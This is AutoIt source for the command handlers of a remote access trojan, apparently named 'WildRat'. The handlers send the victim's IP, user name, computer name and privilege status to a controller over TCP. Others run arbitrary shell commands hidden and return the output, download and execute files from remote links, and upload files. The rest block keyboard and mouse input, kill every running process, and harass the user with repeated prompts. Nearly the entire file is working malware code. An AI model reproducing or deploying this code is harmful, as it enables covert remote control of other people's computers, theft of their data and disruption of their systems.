#include-once
#include <Constants.au3>
Local $Version
Local $Persistence


#Region		;//// RC Funcs ////;
Func RC_GETDATA($hSocket, $Received)
	If IsAdmin() Then
		$Admin = "Yes"
	Else
		$Admin = "No"
	EndIf
	_TCP_Send($hSocket, "PCINFO" & "|" & GetIP("from") & "|" & GetIP("ip") & "|" & @ComputerName & "|" & @UserName & "|" & $Admin & "|" & $Persistence & "|" & @OSVersion & "|" & @CPUArch & "|" & $Version)

EndFunc   ;==>RC_GETDATA
Func RC_CMD($hSocket, $Received)
	_TCP_Send($hSocket, "ANSWER|Output|" & _GetDOSOutput($Received[2]))
EndFunc   ;==>RC_CMD
Func RC_MSGBOX($hSocket, $Received)
	MsgBox(00, $Received[2], $Received[3])
EndFunc   ;==>RC_MSGBOX
Func RC_SHE($hSocket, $Received)
	ShellExecute($Received[2])
EndFunc   ;==>RC_SHE
Func RC_KML($hSocket, $Received)
	If $Received[2] = "LOCK" Then
		BlockInput(1)
	ElseIf $Received[2] = "UNLOCK" Then
		BlockInput(0)
	EndIf
EndFunc   ;==>RC_KML
Func RC_ASK($hSocket, $Received)
	If $Received[2] = "" Then $Received[2] = "WildRat"
	$answer = InputBox($Received[2], $Received[3])
	While $answer = ""
		$answer = InputBox($Received[2], $Received[3])
	WEnd
	_TCP_Send($hSocket, "ANSWER|Answer|" & $answer)
EndFunc   ;==>RC_ASK
Func RC_EXIT($hSocket, $Received)
	Exit
EndFunc   ;==>RC_EXIT
Func RC_BSOD($hSocket, $Received)
	$a = ProcessList()
	For $i = 1 To UBound($a) - 1
		ProcessClose($a[$i][0])
	Next
	Exit
EndFunc   ;==>RC_BSOD
Func RC_DAE($hSocket, $Received)
	$downloadpath = $Received[2]
	$downloadlink = $Received[3]
	Local $hdownload = InetGet($downloadlink, $downloadpath, 1, 1)
	Do
		Sleep(250)
	Until InetGetInfo($hdownload, 2)
	Local $nbytes = InetGetInfo($hdownload, 0)
	InetClose($hdownload)
	ShellExecute($downloadpath)
EndFunc   ;==>RC_DAE
Func RC_CDOPEN($hSocket, $Received)
	CDTray("A:", "OPEN")
	CDTray("B:", "OPEN")
	CDTray("C:", "OPEN")
	CDTray("D:", "OPEN")
	CDTray("E:", "OPEN")
	CDTray("F:", "OPEN")
	CDTray("G:", "OPEN")
	CDTray("H:", "OPEN")
	CDTray("I:", "OPEN")
	CDTray("J:", "OPEN")
	CDTray("K:", "OPEN")
	CDTray("L:", "OPEN")
	CDTray("M:", "OPEN")
	CDTray("N:", "OPEN")
	CDTray("O:", "OPEN")
	CDTray("P:", "OPEN")
	CDTray("Q:", "OPEN")
	CDTray("R:", "OPEN")
	CDTray("S:", "OPEN")
	CDTray("T:", "OPEN")
	CDTray("U:", "OPEN")
	CDTray("V:", "OPEN")
	CDTray("W:", "OPEN")
	CDTray("X:", "OPEN")
	CDTray("Y:", "OPEN")
	CDTray("Z:", "OPEN")
EndFunc   ;==>RC
Func RC_CDCLOSE($hSocket, $Received)
	CDTray("A:", "CLOSE")
	CDTray("B:", "CLOSE")
	CDTray("C:", "CLOSE")
	CDTray("D:", "CLOSE")
	CDTray("E:", "CLOSE")
	CDTray("F:", "CLOSE")
	CDTray("G:", "CLOSE")
	CDTray("H:", "CLOSE")
	CDTray("I:", "CLOSE")
	CDTray("J:", "CLOSE")
	CDTray("K:", "CLOSE")
	CDTray("L:", "CLOSE")
	CDTray("M:", "CLOSE")
	CDTray("N:", "CLOSE")
	CDTray("O:", "CLOSE")
	CDTray("P:", "CLOSE")
	CDTray("Q:", "CLOSE")
	CDTray("R:", "CLOSE")
	CDTray("S:", "CLOSE")
	CDTray("T:", "CLOSE")
	CDTray("U:", "CLOSE")
	CDTray("V:", "CLOSE")
	CDTray("W:", "CLOSE")
	CDTray("X:", "CLOSE")
	CDTray("Y:", "CLOSE")
	CDTray("Z:", "CLOSE")
EndFunc   ;==>RC

Func RC($hSocket, $Received)

EndFunc   ;==>RC


Func RC_ELSE($hSocket, $Received)
	_TCP_Send($hSocket, "ANSWER|Error!|Command not recognized, are you sure the client is updated?")
EndFunc   ;==>RC_ELSE
#EndRegion		;//// RC Funcs ////;

#Region		;//// Other Funcs ////;
Func _GetDOSOutput($sCommand)
	Local $iPID, $sOutput = ""
	$iPID = Run('"' & @ComSpec & '" /c ' & $sCommand, "", @SW_HIDE, $STDERR_CHILD + $STDOUT_CHILD)
	While 1
		$sOutput &= StdoutRead($iPID, False, False)
		If @error Then
			ExitLoop
		EndIf
		Sleep(10)
	WEnd
	Return $sOutput
EndFunc   ;==>_GetDOSOutput
Func SendFile($hSocket, $sFile)
	$FileName = StringSplit(FileGetShortName($sFile), "\")
	ConsoleWrite($hSocket & ":" & "FILE|" & $FileName[$FileName[0]])
	_TCP_Send($hSocket, "FILE|" & $FileName[$FileName[0]])
	Sleep(1000)
	_TCP_Send($hSocket, FileRead($sFile))
EndFunc   ;==>SendFile
#EndRegion		;//// Other Funcs ////;
